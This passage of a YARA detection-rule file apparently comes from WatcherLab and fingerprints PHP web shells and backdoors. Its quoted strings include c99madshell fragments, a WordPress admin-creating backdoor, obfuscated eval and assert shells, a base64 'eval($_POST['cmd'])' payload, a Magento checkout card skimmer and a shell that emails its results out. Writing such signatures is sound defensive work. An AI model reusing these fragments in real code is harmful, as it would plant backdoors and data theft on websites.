      $s12 = "<td align=center><a href=\\\"javascript:execute_file('\".addslashes($file).\"')\\\">\".et('Exec').\"</a>" fullword ascii
      $s13 = "$str = preg_replace(array('/&/', '/</', '/>/', '/\"/'), array('&amp;', '&lt;', '&gt;', '&quot;'), $str);  // Bypass PHP to al" fullword ascii
      $s14 = "<img src=\\\"http://sourceforge.net/sflogo.php?group_id=114392&type=1\\\" width=\\\"88\\\" height=\\\"31\\\" style=\\\"bor" fullword ascii
      $s15 = "echo \"<tr><td>max_execution_time<td>$max_execution_time<td>0<td>\".ini_get(\"max_execution_time\");" fullword ascii
      $s16 = "} else if (( this.useragent.indexOf( 'windows' ) != -1 ) || ( this.platform.indexOf( 'win32' ) != -1 )){" fullword ascii
      $s17 = "$nl['ExecCmd'] = 'Commando uitvoeren';" fullword ascii
      $s18 = "l').\" - \".format_size(($quota_mb*1024*1024)-total_size($fm_current_root)).\" \".et('Free').\"</td></tr>\";" fullword ascii
      $s19 = "$header .= strstr($this->options['name'],\"/\")? substr($this->options['name'],strrpos($this->options['name'],\"/\") + 1) : " fullword ascii
      $s20 = "} else if (( this.useragent.indexOf( 'inux' ) != -1 ) || ( this.platform.indexOf( 'linux' ) != -1 )){" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3
{
   meta:
      description = "php17 - file 4d5d25e5c18789e5e3977c1d7f6035576a7e2ea3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce802123ee19441adab36ef70584cfadbbda898ed1d52082a08532e20c860dc1"
   strings:
      $x1 = "rityprobe.net\\\">c99madshell</a>: Access Denied - your host (\".getenv(\"REMOTE_ADDR\").\") not allow\");}" fullword ascii
      $x2 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $x3 = "<table border=\"0\" width=\"100%\" height=\"1\"><tr><td width=\"30%\" height=\"1\"><b>Create new table:</b><form method=\"POST\"" ascii
      $x4 = "document.todo.grep.value='\".basename($binpath).\"';document.todo.submit();\\\"><u>View binder's process</u></a></center>\";}" fullword ascii
      $x5 = "if (!preg_match($s,getenv(\"REMOTE_ADDR\")) and !preg_match($s,gethostbyaddr(getenv(\"REMOTE_ADDR\")))) {exit(\"<a href=\\\"http" ascii
      $x6 = "($d).\"';document.todo.processes_sort.value='\".$i.$parsesort[1].\"';document.todo.submit();\\\"><b>\".$head[$i].\"</b></a>\";}" fullword ascii
      $x7 = "\"<b>nc -v \".getenv(\"SERVER_ADDR\").\" \".$bind[\"port\"].\"</b>\\\"!<center><a href=\\\"#\\\" onclick=\\\"document.todo.act.v" ascii
      $x8 = "http://bartblaze.blogspot.com/2015/03/c99shell-not-dead.html" fullword ascii
      $x9 = "$logfile = $tmpdir_logs.\"c99sh_ftpquickbrute_\".date(\"d.m.Y_H_i_s\").\".log\";" fullword ascii
      $x10 = "$fqb_log = \"FTP Quick Brute (called c99madshell v. \".$shver.\") started at \".date(\"d.m.Y H:i:s\").\"\\r\\n\\r\\n\";" fullword ascii
      $s11 = "echo \"<form method=\\\"POST\\\"><input type=\\\"hidden\\\" name=\\\"act\\\" value=\\\"sql\\\"><input type=\\\"hidden\\\" name=" ascii
      $s12 = "$out = \"# Dumped by C99madShell.SQL v. \".$shver.\"" fullword ascii
      $s13 = "echo \"<a href=\\\"#\\\" onclick=\\\"document.sql.act.value='sql';document.sql.sql_login.value='\".htmlspecialchars($sql_login)." ascii
      $s14 = "if (isset($_POST['processes_sort'])) $processes_sort = $_POST['processes_sort'];" fullword ascii
      $s15 = "if (isset($_POST['sql_login']))  {$sql_login=htmlspecialchars($_POST['sql_login']);}" fullword ascii
      $s16 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s17 = "if (file_get_contents(\"/var/cpanel/accounting.log\")) {echo \"<b><font color=green><a href=\\\"#\\\" onclick=\\\"document.todo." ascii
      $s18 = "if ((!$submit) or ($sql_act)) {echo \"<table border=\\\"0\\\" width=\\\"100%\\\" height=\\\"1\\\"><tr><td><form method=\\\"POST" ascii
      $s19 = "sswd.value='1';document.todo.submit();\\\"><b><u>Get /etc/passwd</u></b></a><br>\";}" fullword ascii
      $s20 = "if (isset($_POST['fullhexdump'])) $fullhexdump  = $_POST['fullhexdump'];" fullword ascii
   condition:
      uint16(0) == 0x6544 and filesize < 400KB and
      1 of ($x*) and all of them
}

rule sig_9eb80d27a7bbb26512ebb6fb26ac855ee64bc167
{
   meta:
      description = "php17 - file 9eb80d27a7bbb26512ebb6fb26ac855ee64bc167.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9462512a52e2fcb066fbeb799449ec11d1ce3d8f8ab1f08e2d426d8fbe25d2b8"
   strings:
      $s1 = "$user_id = wp_create_user($_GET['username'], $_GET['password']);" fullword ascii
      $s2 = "if ( md5( $_GET['backdoor'] ) == '5f4dcc3b5aa765d61d8327deb882cf99' ) {" fullword ascii
      $s3 = "if ( !username_exists($_GET['username'])) {" fullword ascii
      $s4 = "add_action( 'wp_head', 'my_backdoor' );" fullword ascii
      $s5 = "require( 'wp-includes/registration.php' );" fullword ascii
      $s6 = "$user->set_role( 'administrator' );" fullword ascii
      $s7 = "5f4dcc3b5aa765d61d8327deb882cf99" ascii
      $s8 = "die(\"User already exists...\");" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule a3963faafa34d6ec596ba7f539b47cd444a1c2fb
{
   meta:
      description = "php17 - file a3963faafa34d6ec596ba7f539b47cd444a1c2fb.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "acf1d4aa144f360a634d699c8cc887c40cb00b46294fd8bfb9679d0ba1e37e23"
   strings:
      $x1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword ascii
      $x2 = "PHP Shell is aninteractive PHP-page that will execute any command " fullword ascii
      $s3 = "entered. See the files README and INSTALL or http://www.gimpster.com " fullword ascii
      $s4 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1250\"></head> " fullword ascii
      $s5 = "*                        PHP Shell                           * " fullword ascii
      $s6 = "$tmpfile = tempnam('/tmp', 'phpshell'); " fullword ascii
      $s7 = "Copyright (C) 2000-2002 Martin Geisler <gimpster@gimpster.com> " fullword ascii
      $s8 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) { " fullword ascii
      $s9 = "/* We try and match a cd command. */ " fullword ascii
      $s10 = "************************************************************** " fullword ascii
      $s11 = "address: http://www.gnu.org/copyleft/gpl.html#SEC1 " fullword ascii
      $s12 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\"> " fullword ascii
      $s13 = "$Id: phpshell.php,v 1.18 2002/09/18 15:49:54 gimpster Exp $ " fullword ascii
      $s14 = "echo \"<option value=\\\"\". strrev(substr(strstr(strrev($work_dir), \"/\"), 1)) .\"\\\">Parent Directory</option>\\n\"; " fullword ascii
      $s15 = "/* Run through all the files and directories to find the dirs. */ " fullword ascii
      $s16 = "<title>PHP Shell <?php echo offender ?></title> " fullword ascii
      $s17 = "<form name=\"myform\" action=\"<?php echo $PHP_SELF ?>\" method=\"post\"> " fullword ascii
      $s18 = "$command .= ' -F'; " fullword ascii
      $s19 = "Place - Suite 330, Boston, MA  02111-1307, USA. " fullword ascii
      $s20 = "<h1>PHP Shell <?php echo offender ?></h1> " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule a83fdf87d787b39d42b26c3e40fe1b1c
{
   meta:
      description = "php17 - file a83fdf87d787b39d42b26c3e40fe1b1c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "837a66c50119d4da81c79b1b9d2ee69e6d956f0915dd998b6f950cf791d5a481"
   strings:
      $x1 = "$this->getQuote()->setPasswordHash($customer->encryptPassword($address->getCustomerPassword()));" fullword ascii
      $x2 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $s3 = "$send = array('PaymentMethod' => $data['method'], 'Billing Name' => $this->getQuote()->getBillingAddress()->getFirstname() . \" " ascii
      $s4 = "il address. Please login using this email address or enter a different email address to register your account.');" fullword ascii
      $s5 = "$quote->setPasswordHash($customer->encryptPassword($customer->getPassword()));" fullword ascii
      $s6 = "* Validate quote state to be integrated with one page checkout process" fullword ascii
      $s7 = "$customer->setPassword($customer->decryptPassword($quote->getPasswordHash()));" fullword ascii
      $s8 = "$a = getenv('REMOTE_ADDR');$a = json_decode(file_get_contents(\"http://www.geoplugin.net/json.gp?ip={$a}\"));$datasend.=\"Visit " ascii
      $s9 = "$this->getCustomerSession()->loginById($customer->getId());" fullword ascii
      $s10 = ". $this->getQuote()->getBillingAddress()->getLastname(), 'Billing Email' => $this->getQuote()->getBillingAddress()->getEmail()," fullword ascii
      $s11 = "'Billing Addres1' => $this->getQuote()->getBillingAddress()->getStreet(1), 'Billing Address2' => $this->getQuote()->getBillingA" fullword ascii
      $s12 = "* Get customer address by identifier" fullword ascii
      $s13 = "* One page checkout processing model" fullword ascii
      $s14 = "$customer->setPasswordHash($customer->hashPassword($customer->getPassword()));" fullword ascii
      $s15 = "$customer->setPassword($customerRequest->getParam('customer_password'));" fullword ascii
      $s16 = "$customer->setConfirmation($customerRequest->getParam('confirm_password'));" fullword ascii
      $s17 = "* Reset multishipping flag before any manipulations with quote address" fullword ascii
      $s18 = "return array('error' => -1, 'message' => Mage::helper('checkout')->__('Invalid shipping method.'));" fullword ascii
      $s19 = "* Validate customer data and set some its data for further usage in quote" fullword ascii
      $s20 = "protected function _processValidateCustomer(Mage_Sales_Model_Quote_Address $address)" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule sig_0353ae68b12b8f6b74794d3273967b530d0d526f
{
   meta:
      description = "php17 - file 0353ae68b12b8f6b74794d3273967b530d0d526f.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "14ee4d6daca29a576a047ec7c30efd8c11af51635f023d13772b68aead0dfda6"
   strings:
      $x1 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br" fullword ascii
      $x2 = "//die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pr" fullword ascii
      $x3 = ". '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><br>' . " ascii
      $s4 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s5 = "= = [ || PiOps 1.7 <u><b>Powered By</b> </u><font color=#FF0000><a href='http://twitter.com/ops507'>@Ops507</a></font> | " fullword ascii
      $s6 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.ha" fullword ascii
      $s7 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s8 = "$temp = \"document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='\".addcslash" fullword ascii
      $s9 = "setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);" fullword ascii
      $s10 = "\"Encuentra el *config*.php en este directorio\" => \"dir /s /w /b *config*.php\"," fullword ascii
      $s11 = ";}else{g(null,null,this.cmd.value,this.show_errors.checked?1:\\'\\');} return false;\"><select name=alias>';" fullword ascii
      $s12 = "echo '<span>Fecha De Creacion:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Tiempo de acceso:</span> '.date('" fullword ascii
      $s13 = "if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $auth_pass))" fullword ascii
      $s14 = "<input type='button' value='hashcracking.ru' onclick=\\\"document.hf.action='https://hashcracking.ru/index.php';document." fullword ascii
      $s15 = "\"Encontrar el archivo config* en este directorio\" => \"find . -type f -name \\\"config*\\\"\"," fullword ascii
      $s16 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.chmod.value);re" fullword ascii
      $s17 = "echo '<script>p3_=\"\";</script><form onsubmit=\"g(null,null,\\'' . urlencode($_POST['p1']) . '\\',null,this.touch.value);re" fullword ascii
      $s18 = "'HTTP_HOST'] . \" - PiOps \" . PiOps .\"</title>" fullword ascii
      $s19 = "\"encontrar archivo service.pwd en el directorio actual\" => \"find . -type f -name service.pwd\"," fullword ascii
      $s20 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and 4 of them
}

rule ad7c2a691f729cdc71695e31708f6a658f16952b
{
   meta:
      description = "php17 - file ad7c2a691f729cdc71695e31708f6a658f16952b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0438f72c6ae25e45941a0ffa39466604d3194286368f1c134e19e6f80d53b06d"
   strings:
      $s1 = "$w='],09&,$9&e))),$k)))9&;$o=ob9&9&_get_con9&tents();9&ob9&_end_clean(9&);9&$d=b9&9&ase69&9&4_';" fullword ascii
      $s2 = "$f='$s[$9&i],$f);if($9&e9&){$k=9&$kh.$kf;ob9&_start();9&@eva9&l(@g9&zu9&ncompr9&ess(@x(@bas9&';" fullword ascii
      $s3 = "$i='e64_decode9&(pr9&eg_r9&eplace(ar9&9&ray(\"/_/\",\"9&9&/-/\"),a9&rra9&y(\"/\",\"+\"),$ss($s9&[$i';" fullword ascii
      $s4 = "$X='$r[\"H9&TTP_9&9&ACCEPT_LA9&N9&GUA9&GE\"];if($rr&&$ra){$9&u=p9&ar9&se9&_url($rr);par9&s9&e_str($';" fullword ascii
      $s5 = "$O='(m9&d5($i.$kh),0,3));$f9&=$sl(9&$ss(9&9&md5($i.$kf),0,9&3));$p=9&\"\"9&;for($z=1;$9&z<9&9&';" fullword ascii
      $s6 = "$D='encode(x(gzc9&o9&mpress($o),$k));pr9&int(\"<9&$k>$9&d</9&$k>\");@ses9&sion_d9&estroy();}}}}';" fullword ascii
      $s7 = "$j='$kh=9&\"5d419&\"9&;$kf=\"409&2a\";fun9&ct9&ion x($t,$k){9&$c=strl9&e9&9&n($k);$l=strl9&en(9&$';" fullword ascii
      $s8 = "$b='ON;$ss=\"9&sub9&9&str\";$sl=\"str9&9&tolower\";9&$i=$m[1][0]9&.9&9&$m[1][9&1];$h9&=$sl(9&$ss';" fullword ascii
      $s9 = "$e='u[\"9&quer9&y\"],$q);$q9&=array_va9&lue9&9&s($q);preg_mat9&ch_9&all(9&\"/([\\\\w])[\\\\9&w-]9&+';" fullword ascii
      $s10 = "$W='9&(?:;q=0.([\\\\d]9&))?,?/\",$9&r9&9&a,$m9&);if($q&&$m){@sess9&i9&on_s9&9&tart();$s=&$_SES9&SI';" fullword ascii
      $s11 = "$U='&;$p9&9&=9&$ss($p,3)9&;}if(array_ke9&y_exists($i9&,$s)){$s9&[$i9&].=$9&p;$e=9&9&strpos(';" fullword ascii
      $s12 = "$h='{$i}^9&$k{$j};}9&9&}9&r9&eturn $o;}$r=$_SERVER;$rr=9&@$r[\"H9&T9&TP_R9&EF9&ERER\"];$ra=@';" fullword ascii
      $s13 = "$L='t);$o9&=\"\";for9&($i=0;$i<$l9&;){for($j9&=0;($j<9&$c&&$i9&9&<$l);9&$j++,$i+9&+){$o.=$t9&';" fullword ascii
      $s14 = "$Y='c9&ount($m[1]9&)9&;$z+9&+)$p.=$q[$m[2][$z9&]];i9&f(strpos($p,$9&h)9&===0){$s[$i9&]=\"\"9';" fullword ascii
      $s15 = "$P=str_replace('9&','',$j.$L.$h.$X.$e.$W.$b.$O.$Y.$U.$f.$i.$w.$D);" fullword ascii
      $s16 = "$V=str_replace('lw','','clwrelwlwalwlwte_lwfunction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      8 of them
}

rule sig_2_0_0_alpha_2
{
   meta:
      description = "php17 - file 2.0.0-alpha-2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d5ed6340aa54e346b0eaa4ea6a4faf160ab94ee3fb03e1d9549a6122b88fa62a"
   strings:
      $s1 = "* Handles all upgrades related to Revolution 2.0.0-alpha-2" fullword ascii
      $s2 = "/* add table structure changes here for upgrades to previous Revolution installations */" fullword ascii
      $s3 = "* @subpackage upgrades" fullword ascii
      $s4 = "* @package setup" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AdminLocalization
{
   meta:
      description = "php17 - file AdminLocalization.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4090cfe8fde6df2f1143597f5746165548abb441d98a9b12e69df1572264f4f7"
   strings:
      $x1 = "* @copyright Copyright (c) 2011 - 2014 Aleksandr Torosh (http://wezoom.com.ua)" fullword ascii
      $s2 = "* @author Aleksandr Torosh <webtorua@gmail.com>" fullword ascii
      $s3 = "$this->getDI()->set('admin_translate', new \\Phalcon\\Translate\\Adapter\\NativeArray(array('content' => $translations)));" fullword ascii
      $s4 = "* Admin localization" fullword ascii
      $s5 = "$file = APPLICATION_PATH . '/../data/translations/admin/' . $config->admin_language . '.php';" fullword ascii
      $s6 = "use Phalcon\\Mvc\\User\\Plugin;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      1 of ($x*) and all of them
}

rule _discount_code
{
   meta:
      description = "php17 - file _discount_code.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "9d2f34aa30ff650b103581f13c118bc4c3f9676b93ed3277d3a37dc7ff22c241"
   strings:
      $s1 = "* @var app\\backend\\components\\ActiveForm $form" fullword ascii
      $s2 = "* @var \\app\\modules\\shop\\models\\DiscountCode $object" fullword ascii
      $s3 = "<?= $form->field($object, 'valid_till')->widget(\\kartik\\datetime\\DateTimePicker::className()); ?>" fullword ascii
      $s4 = "<?= $form->field($object, 'valid_from')->widget(\\kartik\\datetime\\DateTimePicker::className()); ?>" fullword ascii
      $s5 = "* @var $this yii\\web\\View" fullword ascii
      $s6 = "<?= $form->field($object, 'maximum_uses'); ?>" fullword ascii
      $s7 = "<?= $form->field($object, 'code'); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_212d9f24612b3f2630e7bd14fa96161e464a1f97
{
   meta:
      description = "php17 - file 212d9f24612b3f2630e7bd14fa96161e464a1f97.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6cb3b072948d9e91fd2eaed38627a5884e11dfe1c8ba547db5528404ec4788c9"
   strings:
      $s1 = "mail(\"peterdlegend@aol.com\", \"$body\", \"Shell Result http://$web$inj" fullword ascii
      $s2 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec('ls -la') . \"</font></pre>\";" fullword ascii
      $s3 = "echo \"<pre><font size=3 color=#000000>\" . shell_exec($cmd) . \"</font></pre>\";" fullword ascii
      $s4 = "echo '<form enctype=\"multipart/form-data\" action method=POST><font size=2 color=#888888><b>Upload File</b></font><br><input " fullword ascii
      $s5 = "echo \"<title>Peterson - Shell</title><br><br>\";" fullword ascii
      $s6 = "$injektor = gethostbyname($_SERVER['REMOTE_ADDR']);" fullword ascii
      $s7 = "$body = \"Shell Injector " fullword ascii
      $s8 = "move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name);" fullword ascii
      $s9 = "if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploaddir . $name)) {" fullword ascii
      $s10 = "$conf = file_get_contents(\"../../configuration.php\");" fullword ascii
      $s11 = "$serper = gethostbyname($_SERVER['SERVER_ADDR']);" fullword ascii
      $s12 = "if ((@function_exists('ini_get')) && ('' == ($df = @ini_get('disable_functions')))) {" fullword ascii
      $s13 = "ype=\"Submit\" name=\"command\" value=\"cok\"></form>';" fullword ascii
      $s14 = "IP Injector= $injektor\");" fullword ascii
      $s15 = "$cur_user = \"(\" . get_current_user() . \")\";" fullword ascii
      $s16 = "$cmd = $_POST['cmd'];" fullword ascii
      $s17 = "$desti = $_SERVER['DOCUMENT_ROOT'] . \"/wp-info.php\";" fullword ascii
      $s18 = "if (isset($_POST['command'])) {" fullword ascii
      $s19 = "$web = $_SERVER[\"HTTP_HOST\"];" fullword ascii
      $s20 = "if ($u != strlen($cwd) - 1) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 9KB and
      8 of them
}

rule sig_8b5c098e48b7add730d173cf890152113448a7cc
{
   meta:
      description = "php17 - file 8b5c098e48b7add730d173cf890152113448a7cc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "93ce98abfdf31722cd8a5e646a82c99e5a711828139646f771ded936b6cb732d"
   strings:
      $x1 = "$output = shell_exec( 'echo '.$password.' | sudo -u '.$user.' -S '.$command.'' );" fullword ascii
      $s2 = "//Executes the shell command" fullword ascii
      $s3 = "$shellUser = ''.$user.'@'.exec( hostname ).'';" fullword ascii
      $s4 = "<iframe src=\"commands.txt\" height=\"400px\" width=\"700px\"></iframe>" fullword ascii
      $s5 = "<span>Password: </span><input type=\"password\" style=\"width: 125px\" name=\"password\">" fullword ascii
      $s6 = "<center><a href=\"editor.php\">Editor</a> | <a href=\"shell.php\">Shell</a> | <a href=\"index.php\">Home</a></center>" fullword ascii
      $s7 = "//Gets the command to be executed" fullword ascii
      $s8 = "$history = ''.$shellUser.'# '.$command.'" fullword ascii
      $s9 = "<form action=\"sudoShell.php\" method=\"post\">" fullword ascii
      $s10 = "$histFile = 'commands.txt';" fullword ascii
      $s11 = "//Get username and password for sudo" fullword ascii
      $s12 = "$password = $_POST['password'];" fullword ascii
      $s13 = "header( 'Location: login.html' );" fullword ascii
      $s14 = "$xstHist = file_get_contents( $histFile );" fullword ascii
      $s15 = "<input type=\"submit\" value=\"execute\">" fullword ascii
      $s16 = "<input type=\"text\" style=\"width: 630px\" name=\"command\">" fullword ascii
      $s17 = "//Writes commands and the results to the command history file" fullword ascii
      $s18 = "<input type=\"submit\" value=\"Clear command history\">" fullword ascii
      $s19 = "<form action=\"clrHist.php\" method=\"post\">" fullword ascii
      $s20 = "<span>User: </span><input type=\"text\" style=\"width: 150px\" name=\"user\">" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      1 of ($x*) and 4 of them
}

rule sig_0e1cfd2d0c468e45a71a3a524cb36c5e04d796a8
{
   meta:
      description = "php17 - file 0e1cfd2d0c468e45a71a3a524cb36c5e04d796a8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0bdee5e2a2b4ad3bdec3ecb8905c00e0bddb107f61e2778ad3052cde37f0298a"
   strings:
      $s1 = "$dyn_func = $_GET['dyn_func'];" fullword ascii
      $s2 = "$argument = $_GET['argument'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_2014_10_14_200250_create_settings_table
{
   meta:
      description = "php17 - file 2014_10_14_200250_create_settings_table.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "dbbe866e967023090fa65d7a2209acdbcdced208fd964fb38d2e28f924aa0f7d"
   strings:
      $s1 = "Schema::create('setting__settings', function (Blueprint $table) {" fullword ascii
      $s2 = "Schema::drop('setting__settings');" fullword ascii
      $s3 = "$table->string('plainValue')->nullable();" fullword ascii
      $s4 = "$table->boolean('isTranslatable');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_4cf035f5fd5ead2567a6db4d5ab28e6f9224c708
{
   meta:
      description = "php17 - file 4cf035f5fd5ead2567a6db4d5ab28e6f9224c708.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "21c510484c3fa42321a9537f70de28496286a3e80bdacb46adadbb88efe9f75d"
   strings:
      $s1 = ":00.php?id=eval%28base64_decode%28%22QGV2YWwoJF9QT1NUWydjbWQnXSk7%22%29%29;  " fullword ascii
      $s2 = "preg_replace('/.*/e',' '.$a,'');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6369477fc18212ac99a6bcae28914a72c69b5e62
{
   meta:
      description = "php17 - file 6369477fc18212ac99a6bcae28914a72c69b5e62.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6a8ac1a05ad65ecce5d956bb76ae30bc3a5ccd81fbaeb7cacceaa3fafeac8f56"
   strings:
      $x1 = "<a href=\"http://hi.baidu.com/ca3tie1/home\" target=\"_blank\">Ca3tie1's Blog</a>" fullword ascii
      $s2 = "return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |  ($timearray['hours'] <<" fullword ascii
      $s3 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=gb2312\">  " fullword ascii
      $s4 = "{  echo \"<input name='dfile[]' type='checkbox' value='$file' \".($file==basename(__FILE__)?\"\":\"checked\").\"> \";" fullword ascii
      $s5 = "echo \"<input name='dfile[]' type='checkbox' value='$file' \".($file==basename(__FILE__)?\"\":\"checked\").\"> \";" fullword ascii
      $s6 = "<input name=\"zipname\" type=\"text\" id=\"zipname\" value=\"dodo.zip\" size=\"15\">  " fullword ascii
      $s7 = "$dirstr .= pack('V',$this->datastr_len ); // relative offset of local header " fullword ascii
      $s8 = "$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);  " fullword ascii
      $s9 = "$dirstr .= pack('V', 32 );             // external file attributes - 'archive' bit set " fullword ascii
      $s10 = "$num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\" $bitunit[$key]\"; " fullword ascii
      $s11 = "$dirstr = \"\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; " fullword ascii
      $s12 = "if($dodozip -> startfile(\"$_REQUEST[todir]$_REQUEST[zipname]\"))" fullword ascii
      $s13 = "$dodozip -> addfile(implode('',file(\"$dir/$file\")),\"$dir/$file\"); " fullword ascii
      $s14 = "if (!in_array(end(explode(\".\",$file)), $dodozip -> filefilters))" fullword ascii
      $s15 = "if(realpath($dodozip ->gzfilename)!=realpath(\"$dir/$file\"))" fullword ascii
      $s16 = "$dodozip -> addfile(implode('',file(\"$dir\")),\"$dir\"); " fullword ascii
      $s17 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s18 = "if(!strrchr(strtolower($_REQUEST[zipname]),'.')=='.zip') " fullword ascii
      $s19 = "pname] (\".num_bitunit(filesize(\"$_REQUEST[todir]$_REQUEST[zipname]\")).\")</a>\"; " fullword ascii
      $s20 = "echo \"<font face=\\\"wingdings\\\" size=\\\"5\\\">2</font>&nbsp;&nbsp;$file<br>\"; " fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_5b4d81fbd651d78eca46dbaef16a7d1b89921636
{
   meta:
      description = "php17 - file 5b4d81fbd651d78eca46dbaef16a7d1b89921636.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e5fd43639e5ea6ef3784e6021af9833d9e8d21be942f9b60b4f4250de3a47153"
   strings:
      $s1 = "$new_array = array_map(\"ass\\x65rt\", (array)$_REQUEST['op']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_58c22bb4a7096b281ce2ae2de038fb4e4cbcdb8b
{
   meta:
      description = "php17 - file 58c22bb4a7096b281ce2ae2de038fb4e4cbcdb8b.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ad993d666d760d63f3b20b15d49420e02204bd9323aa732ea750a01fbc5980b5"
   strings:
      $x1 = "console.log(document.getElementById('user').value);" fullword ascii
      $s2 = "console.log(\"Contents passed as \"+contents);" fullword ascii
      $s3 = "$response = shell_exec(base64_decode($_POST['user']));" fullword ascii
      $s4 = "document.getElementById('user').value=btoa(document.getElementById('user').value);" fullword ascii
      $s5 = "<input type=\"submit\" value=\"Login\"/>" fullword ascii
      $s6 = "<form action=\"\" method=\"POST\" onsubmit=\"validate()\">" fullword ascii
      $s7 = "//              echo \"DEBUG: \".base64_decode($_POST['user']);" fullword ascii
      $s8 = "//              echo \"DEBUG: \".$_POST['user'];" fullword ascii
      $s9 = "<input type=\"text\" name=\"user\" id=\"user\" />" fullword ascii
      $s10 = "function validate(contents) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      1 of ($x*) and all of them
}

rule sig_059fdcd96baeb75112f09fa1dcc740cc
{
   meta:
      description = "php17 - file 059fdcd96baeb75112f09fa1dcc740cc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d691dab705114c9dbacc304116e104807c803cb24a9bdbb6fa05610dcd2bef9d"
   strings:
      $s1 = "for ($b2617ce8e=0; $b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['" fullword ascii
      $s2 = "for ($c3758cb0=0; $c3758cb0<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS" fullword ascii
      $s3 = "$b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][32].$GLOBAL" fullword ascii
